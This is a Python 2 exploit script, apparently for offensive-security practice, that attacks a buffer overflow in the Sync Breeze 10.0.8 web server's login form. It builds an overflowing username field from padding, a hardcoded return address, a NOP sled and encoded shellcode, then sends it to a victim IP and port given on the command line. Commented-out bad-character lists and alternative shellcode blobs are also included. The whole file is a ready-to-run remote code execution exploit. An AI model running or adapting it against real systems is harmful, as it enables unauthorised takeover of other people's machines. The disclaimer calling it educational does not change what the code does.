#!/bin/python2
import time
import socket
#badcahr: x0a,x0d,x25,x26,x2b,x3d
import sys

banner=""

banner+=" - Powered by_\r\n"
banner+="\r\n"
banner+="            *     _ _ _ _ _ _ _ _ _ _\r\n"
banner+="         //|-|   / _ \  | ___\ | ___ |\r\n"
banner+="\       // | |  / /_\ \ | |_/ || |_/ /\r\n"
banner+=" \     //  | | |   _   ||   _/ |    /\r\n"
banner+="  \   //   | |_|  | |  ||  |  a| |\ \r\n"
banner+="   \_//   \___/ \_| |_/ |__|   \_| \_|BOOF\r\n"
   
   
print banner

#address"\x83\x0c\x09\x10"

#note: value in indaian(reverse)
############################################
#badchars = (
#"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0e\x0f\x10"
#"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
#"\x21\x22\x23\x24\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
#"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3e\x3f\x40"
#"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
#"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
#"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
#"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
#"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
#"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
#"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
#"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
#"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
#"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
#"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
#"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" )



#shell+="\xd9\xc3\xb8\x0c\xe8\xbd\x39\xd9\x74\x24\xf4\x5f\x33\xc9"
#shell+="\xb1\x52\x83\xc7\x04\x31\x47\x13\x03\x4b\xfb\x5f\xcc\xaf"
#shell+="\x13\x1d\x2f\x4f\xe4\x42\xb9\xaa\xd5\x42\xdd\xbf\x46\x73"
#shell+="\x95\xed\x6a\xf8\xfb\x05\xf8\x8c\xd3\x2a\x49\x3a\x02\x05"
#shell+="\x4a\x17\x76\x04\xc8\x6a\xab\xe6\xf1\xa4\xbe\xe7\x36\xd8"
#shell+="\x33\xb5\xef\x96\xe6\x29\x9b\xe3\x3a\xc2\xd7\xe2\x3a\x37"
#shell+="\xaf\x05\x6a\xe6\xbb\x5f\xac\x09\x6f\xd4\xe5\x11\x6c\xd1"
#shell+="\xbc\xaa\x46\xad\x3e\x7a\x97\x4e\xec\x43\x17\xbd\xec\x84"
#shell+="\x90\x5e\x9b\xfc\xe2\xe3\x9c\x3b\x98\x3f\x28\xdf\x3a\xcb"
#shell+="\x8a\x3b\xba\x18\x4c\xc8\xb0\xd5\x1a\x96\xd4\xe8\xcf\xad"
#shell+="\xe1\x61\xee\x61\x60\x31\xd5\xa5\x28\xe1\x74\xfc\x94\x44"
#shell+="\x88\x1e\x77\x38\x2c\x55\x9a\x2d\x5d\x34\xf3\x82\x6c\xc6"
#shell+="\x03\x8d\xe7\xb5\x31\x12\x5c\x51\x7a\xdb\x7a\xa6\x7d\xf6"
#shell+="\x3b\x38\x80\xf9\x3b\x11\x47\xad\x6b\x09\x6e\xce\xe7\xc9"
#shell+="\x8f\x1b\xa7\x99\x3f\xf4\x08\x49\x80\xa4\xe0\x83\x0f\x9a"
#shell+="\x11\xac\xc5\xb3\xb8\x57\x8e\x7b\x94\x56\x48\x14\xe7\x58"
#shell+="\x55\x5f\x6e\xbe\x3f\x8f\x27\x69\xa8\x36\x62\xe1\x49\xb6"
#shell+="\xb8\x8c\x4a\x3c\x4f\x71\x04\xb5\x3a\x61\xf1\x35\x71\xdb"
#shell+="\x54\x49\xaf\x73\x3a\xd8\x34\x83\x35\xc1\xe2\xd4\x12\x37"
#shell+="\xfb\xb0\x8e\x6e\x55\xa6\x52\xf6\x9e\x62\x89\xcb\x21\x6b"
#shell+="\x5c\x77\x06\x7b\x98\x78\x02\x2f\x74\x2f\xdc\x99\x32\x99"
#shell+="\xae\x73\xed\x76\x79\x13\x68\xb5\xba\x65\x75\x90\x4c\x89"
#shell+="\xc4\x4d\x09\xb6\xe9\x19\x9d\xcf\x17\xba\x62\x1a\x9c\xca"


#shell=""
#shell+="\xba\xf0\x99\xed\x98\xd9\xc1\xd9\x74\x24\xf4\x5b\x33\xc9"
#shell+="\xb1\x52\x31\x53\x12\x83\xc3\x04\x03\xa3\x97\x0f\x6d\xbf"
#shell+="\x40\x4d\x8e\x3f\x91\x32\x06\xda\xa0\x72\x7c\xaf\x93\x42"
#shell+="\xf6\xfd\x1f\x28\x5a\x15\xab\x5c\x73\x1a\x1c\xea\xa5\x15"
#shell+="\x9d\x47\x95\x34\x1d\x9a\xca\x96\x1c\x55\x1f\xd7\x59\x88"
#shell+="\xd2\x85\x32\xc6\x41\x39\x36\x92\x59\xb2\x04\x32\xda\x27"
#shell+="\xdc\x35\xcb\xf6\x56\x6c\xcb\xf9\xbb\x04\x42\xe1\xd8\x21"
#shell+="\x1c\x9a\x2b\xdd\x9f\x4a\x62\x1e\x33\xb3\x4a\xed\x4d\xf4"
#shell+="\x6d\x0e\x38\x0c\x8e\xb3\x3b\xcb\xec\x6f\xc9\xcf\x57\xfb"
#shell+="\x69\x2b\x69\x28\xef\xb8\x65\x85\x7b\xe6\x69\x18\xaf\x9d"
#shell+="\x96\x91\x4e\x71\x1f\xe1\x74\x55\x7b\xb1\x15\xcc\x21\x14"
#shell+="\x29\x0e\x8a\xc9\x8f\x45\x27\x1d\xa2\x04\x20\xd2\x8f\xb6"
#shell+="\xb0\x7c\x87\xc5\x82\x23\x33\x41\xaf\xac\x9d\x96\xd0\x86"
#shell+="\x5a\x08\x2f\x29\x9b\x01\xf4\x7d\xcb\x39\xdd\xfd\x80\xb9"
#shell+="\xe2\x2b\x06\xe9\x4c\x84\xe7\x59\x2d\x74\x80\xb3\xa2\xab"
#shell+="\xb0\xbc\x68\xc4\x5b\x47\xfb\x2b\x33\x46\xef\xc3\x46\x48"
#shell+="\x1e\x48\xce\xae\x4a\x60\x86\x79\xe3\x19\x83\xf1\x92\xe6"
#shell+="\x19\x7c\x94\x6d\xae\x81\x5b\x86\xdb\x91\x0c\x66\x96\xcb"
#shell+="\x9b\x79\x0c\x63\x47\xeb\xcb\x73\x0e\x10\x44\x24\x47\xe6"
#shell+="\x9d\xa0\x75\x51\x34\xd6\x87\x07\x7f\x52\x5c\xf4\x7e\x5b"
#shell+="\x11\x40\xa5\x4b\xef\x49\xe1\x3f\xbf\x1f\xbf\xe9\x79\xf6"
#shell+="\x71\x43\xd0\xa5\xdb\x03\xa5\x85\xdb\x55\xaa\xc3\xad\xb9"
#shell+="\x1b\xba\xeb\xc6\x94\x2a\xfc\xbf\xc8\xca\x03\x6a\x49\xfa"
#shell+="\x49\x36\xf8\x93\x17\xa3\xb8\xf9\xa7\x1e\xfe\x07\x24\xaa"
#shell+="\x7f\xfc\x34\xdf\x7a\xb8\xf2\x0c\xf7\xd1\x96\x32\xa4\xd2"
#shell+="\xb2";#
shell=""
shell+="\xb8\xd8\x13\xcd\xcb\xd9\xcc\xd9\x74\x24\xf4\x5f\x31\xc9"
shell+="\xb1\x52\x31\x47\x12\x83\xef\xfc\x03\x9f\x1d\x2f\x3e\xe3"
shell+="\xca\x2d\xc1\x1b\x0b\x52\x4b\xfe\x3a\x52\x2f\x8b\x6d\x62"
shell+="\x3b\xd9\x81\x09\x69\xc9\x12\x7f\xa6\xfe\x93\xca\x90\x31"
shell+="\x23\x66\xe0\x50\xa7\x75\x35\xb2\x96\xb5\x48\xb3\xdf\xa8"
shell+="\xa1\xe1\x88\xa7\x14\x15\xbc\xf2\xa4\x9e\x8e\x13\xad\x43"
shell+="\x46\x15\x9c\xd2\xdc\x4c\x3e\xd5\x31\xe5\x77\xcd\x56\xc0"
shell+="\xce\x66\xac\xbe\xd0\xae\xfc\x3f\x7e\x8f\x30\xb2\x7e\xc8"
shell+="\xf7\x2d\xf5\x20\x04\xd3\x0e\xf7\x76\x0f\x9a\xe3\xd1\xc4"
shell+="\x3c\xcf\xe0\x09\xda\x84\xef\xe6\xa8\xc2\xf3\xf9\x7d\x79"
shell+="\x0f\x71\x80\xad\x99\xc1\xa7\x69\xc1\x92\xc6\x28\xaf\x75"
shell+="\xf6\x2a\x10\x29\x52\x21\xbd\x3e\xef\x68\xaa\xf3\xc2\x92"
shell+="\x2a\x9c\x55\xe1\x18\x03\xce\x6d\x11\xcc\xc8\x6a\x56\xe7"
shell+="\xad\xe4\xa9\x08\xce\x2d\x6e\x5c\x9e\x45\x47\xdd\x75\x95"
shell+="\x68\x08\xd9\xc5\xc6\xe3\x9a\xb5\xa6\x53\x73\xdf\x28\x8b"
shell+="\x63\xe0\xe2\xa4\x0e\x1b\x65\x0b\x66\x22\x61\xe3\x75\x24"
shell+="\x88\x48\xf0\xc2\xe0\xbe\x55\x5d\x9d\x27\xfc\x15\x3c\xa7"
shell+="\x2a\x50\x7e\x23\xd9\xa5\x31\xc4\x94\xb5\xa6\x24\xe3\xe7"
shell+="\x61\x3a\xd9\x8f\xee\xa9\x86\x4f\x78\xd2\x10\x18\x2d\x24"
shell+="\x69\xcc\xc3\x1f\xc3\xf2\x19\xf9\x2c\xb6\xc5\x3a\xb2\x37"
shell+="\x8b\x07\x90\x27\x55\x87\x9c\x13\x09\xde\x4a\xcd\xef\x88"
shell+="\x3c\xa7\xb9\x67\x97\x2f\x3f\x44\x28\x29\x40\x81\xde\xd5"
shell+="\xf1\x7c\xa7\xea\x3e\xe9\x2f\x93\x22\x89\xd0\x4e\xe7\xb9"
shell+="\x9a\xd2\x4e\x52\x43\x87\xd2\x3f\x74\x72\x10\x46\xf7\x76"
shell+="\xe9\xbd\xe7\xf3\xec\xfa\xaf\xe8\x9c\x93\x45\x0e\x32\x93"
shell+="\x4f";

import argparse
import time
parser = argparse.ArgumentParser(description='BOF is script for automation bufferOverFlow attack on sync breeze 10.0.8, this tools only for educational and proof of concept. am not responsible for any misuse or illegal activities')
parser.add_argument('-i','--ip' , help = 'IP of victim machine' , required=True)
parser.add_argument('-p' ,'--port' , help = 'Port of web server, defalut[80]' , default=80)
args = parser.parse_args()
print " ========================================== "
print "start attack victim "+str(args.ip) + " on port "+str(args.port)
print " ========================================== "
time.sleep(4)
pat ="A" * 780 + "\x83\x0c\x09\x10" + "\x90"*20 + shell +"\x90"* 20
payload="username="+pat+"&password=admin"
request=""
request+="POST /login HTTP/1.1\r\n"
request+="Host: "+args.ip+"\r\n"
request+="User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0\r\n"
request+="Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
request+="Accept-Language: en-US,en;q=0.5\r\n"
request+="Accept-Encoding: gzip, deflate\r\n"
request+="Content-Type: application/x-www-form-urlencoded\r\n"
request+="Content-Length: "+str(len(payload))+"\r\n"
request+="Origin: http://"+args.ip+"\r\n"
request+="Connection: close\r\n"
request+="Referer: http://"+args.ip+"/login\r\n"
request+="Upgrade-Insecure-Requests: 1\r\n"
request+="\r\n"
request+=payload
print request
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((args.ip,int(args.port)))
s.send(request)
print s.recv(1024)
s.close()
